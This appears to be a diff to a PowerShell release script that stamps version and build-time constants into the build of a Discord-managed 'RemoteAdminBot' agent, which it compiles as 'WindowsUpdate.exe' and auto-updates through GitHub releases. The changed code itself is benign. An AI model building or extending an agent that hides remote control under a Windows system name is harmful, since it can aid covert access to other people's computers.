@@ -141,7 +141,30 @@ if (-not (Test-Path $iconDest)) {
     Write-Host "[ICON] Icon present ($iconDest) - skip extract." -ForegroundColor DarkGray
 }
 
-# ---------------- 2) Build primary (WindowsUpdate.exe) ----------------
+# ---------------- 2) Stamp ReleaseInfo.cs with the version + UTC build time ----------
+# The agent's startup Discord embed reads these two constants and prints them
+# in the Version field so an operator can see at a glance which release is
+# alive on which PC. We rewrite the file with the current -Version argument
+# right before dotnet publish, then restore the "dev" placeholder in a
+# try/finally pattern so a dev-local build after this release still shows
+# the placeholder rather than claiming to be v1.0.40.
+$releaseInfoPath = Join-Path $agentSource "RemoteAdminBot.Agent\ReleaseInfo.cs"
+$buildUtc = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
+if (Test-Path $releaseInfoPath) {
+    $releaseInfoOriginal = Get-Content -Raw -LiteralPath $releaseInfoPath
+    $stamped = $releaseInfoOriginal `
+        -replace 'public const string Version\s*=\s*"[^"]*";',  ('public const string Version  = "' + $Version + '";') `
+        -replace 'public const string BuildUtc\s*=\s*"[^"]*";', ('public const string BuildUtc = "' + $buildUtc + '";')
+    Set-Content -LiteralPath $releaseInfoPath -Value $stamped -Encoding utf8
+    Write-Host "[STAMP] ReleaseInfo.cs: Version=$Version BuildUtc=$buildUtc" -ForegroundColor DarkGray
+} else {
+    Write-Host "[WARN] $releaseInfoPath nicht gefunden - Discord-Embed zeigt 'dev'." -ForegroundColor Yellow
+    $releaseInfoOriginal = $null
+}
+
+try {
+
+# ---------------- 3) Build primary (WindowsUpdate.exe) ----------------
 if (-not $SkipBuild) {
     Write-Host "[BUILD] WindowsUpdate.exe (primary, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
     Push-Location $agentSource
@@ -266,3 +289,16 @@ gh release create "v$Version" @assets --title "v$Version" --notes $notesArg
 if ($LASTEXITCODE -ne 0) { Fail "gh release create failed" }
 Write-Host "[OK]   Release v$Version live" -ForegroundColor Green
 Write-Host "       Agents pull within autoUpdateIntervalMinutes. Trigger now: /checkupdate force" -ForegroundColor Green
+
+} # end try (ReleaseInfo stamp)
+finally {
+    # Restore the "dev" placeholder in ReleaseInfo.cs so a dev-local build
+    # after this release does not claim to be whatever version we just shipped.
+    # Runs even on Fail / Ctrl-C so the working tree stays clean regardless.
+    if ($releaseInfoOriginal) {
+        try {
+            Set-Content -LiteralPath $releaseInfoPath -Value $releaseInfoOriginal -Encoding utf8
+            Write-Host "[STAMP] ReleaseInfo.cs restored to dev placeholder" -ForegroundColor DarkGray
+        } catch { Write-Host "[WARN] could not restore ReleaseInfo.cs: $_" -ForegroundColor Yellow }
+    }
+}
